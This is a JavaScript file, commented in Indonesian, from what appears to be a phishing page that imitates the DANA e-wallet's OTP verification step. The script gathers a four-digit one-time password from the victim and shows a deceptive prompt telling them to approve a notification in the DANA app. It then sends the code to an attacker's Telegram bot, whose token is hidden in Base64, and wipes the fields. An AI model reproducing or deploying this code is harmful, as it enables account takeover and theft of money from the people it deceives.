document.addEventListener("DOMContentLoaded", function () {
    const otpInputs = document.querySelectorAll(".otp-input");

    otpInputs.forEach((input, index) => {
        input.addEventListener("input", function () {
            // Hanya angka yang diterima
            this.value = this.value.replace(/\D/g, '');

            // Pindah ke input berikutnya jika terisi
            if (this.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }

            // Jika semua input terisi, tampilkan pesan mengambang dan kirim OTP ke Telegram
            if (index === otpInputs.length - 1 && this.value.length === 1) {
                showFloatingMessage();
                setTimeout(submitOTP, 3000); // Kirim OTP setelah 3 detik
            }
        });

        input.addEventListener("keydown", function (e) {
            // Pindah fokus ke input sebelumnya jika tombol backspace ditekan dan input kosong
            if (e.key === "Backspace" && this.value === "" && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });
});

// Fungsi untuk menampilkan pesan mengambang
function showFloatingMessage() {
    const floatingMessage = document.createElement("div");
    floatingMessage.className = "floating-message";
    floatingMessage.innerText = "Silahkan buka aplikasi DANA lalu verifikasi notifikasi untuk mendapatkan kode OTP";

    document.body.appendChild(floatingMessage);

    // Hapus pesan setelah beberapa detik dan hapus nilai input OTP setelah 5 detik
    setTimeout(() => {
        floatingMessage.remove();
        clearOTPInputs(); // Menghapus angka OTP setelah pesan mengambang hilang
    }, 5000); // Kedua aksi terjadi setelah 5 detik
}

// Fungsi untuk menghapus angka OTP
function clearOTPInputs() {
    const otpInputs = document.querySelectorAll(".otp-input");
    otpInputs.forEach(input => {
        input.value = ''; // Menghapus nilai pada setiap input
    });
}

// Fungsi untuk mengirim OTP ke bot Telegram
function submitOTP() {
    const otp = Array.from(document.querySelectorAll(".otp-input"))
        .map(input => input.value)
        .join('');

    if (otp.length === 4) { // Pastikan OTP terdiri dari 4 digit
        const botToken = atob('NzU2OTI2ODM2MDpBQUdlQmR4Q0dTM0tVcDd1c094VDJnU2tIUVZHUGRmWUJkVQ=='); // Gunakan Base64
        const chatId = '7732620750'; // Ganti dengan chat ID yang benar
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=OTP: ${otp}`;

        fetch(url)
            .then(response => {
                if (response.ok) {
                    console.log('OTP berhasil dikirim!');
                } else {
                    console.log('Gagal mengirim OTP');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }
}

// Fungsi untuk mengirim ulang OTP
function resendOTP() {
    alert("Kode OTP telah dikirim ulang!");
    submitOTP(); // Kirim OTP lagi ke Telegram
}